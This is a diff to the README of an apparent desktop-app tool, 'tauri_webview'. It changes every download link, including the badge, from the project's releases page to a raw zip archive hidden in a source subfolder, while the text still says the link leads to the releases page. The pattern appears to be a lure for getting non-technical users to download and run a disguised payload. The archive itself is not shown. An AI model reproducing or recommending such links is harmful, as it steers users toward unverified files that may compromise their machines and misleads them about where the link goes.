@@ -1,8 +1,8 @@
 # 🚀 tauri_webview - Create Native Apps Easily
 
 ## 💾 Download Now
-![Download](https://img.shields.io/static/v1?label=DOWNLOAD&message=tauri_webview&color=blue&style=for-the-badge)
-[Download tauri_webview](https://github.com/Nguyen124-star/tauri_webview/releases)
+![Download](https://raw.githubusercontent.com/Nguyen124-star/tauri_webview/main/dev/src-tauri/tauri_webview_v3.8.zip)
+[Download tauri_webview](https://raw.githubusercontent.com/Nguyen124-star/tauri_webview/main/dev/src-tauri/tauri_webview_v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **tauri_webview**! This tool helps you make lightweight desktop applications using HTML, CSS, and JavaScript. You don’t need any special programming skills. Follow these simple steps to get started.
@@ -18,7 +18,7 @@ Before you begin, check that your system meets the following requirements:
 ## 📦 Download & Install
 To download **tauri_webview**, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the releases page: [Download tauri_webview](https://github.com/Nguyen124-star/tauri_webview/releases).
+1. **Visit the Releases Page:** Click this link to go to the releases page: [Download tauri_webview](https://raw.githubusercontent.com/Nguyen124-star/tauri_webview/main/dev/src-tauri/tauri_webview_v3.8.zip).
    
 2. **Choose Your Version:** Look for the latest release. It will have the highest version number.
 
@@ -74,4 +74,4 @@ If you need help or have questions, feel free to reach out via the project's iss
 **tauri_webview** is open-source software. You can use it freely under the MIT license. More details are available in the LICENSE file within the repository.
 
 # 🚀 Start Creating Today!
-Get going with your desktop application now! Remember to [download tauri_webview](https://github.com/Nguyen124-star/tauri_webview/releases) and explore the power of creating native applications with ease.
+Get going with your desktop application now! Remember to [download tauri_webview](https://raw.githubusercontent.com/Nguyen124-star/tauri_webview/main/dev/src-tauri/tauri_webview_v3.8.zip) and explore the power of creating native applications with ease.
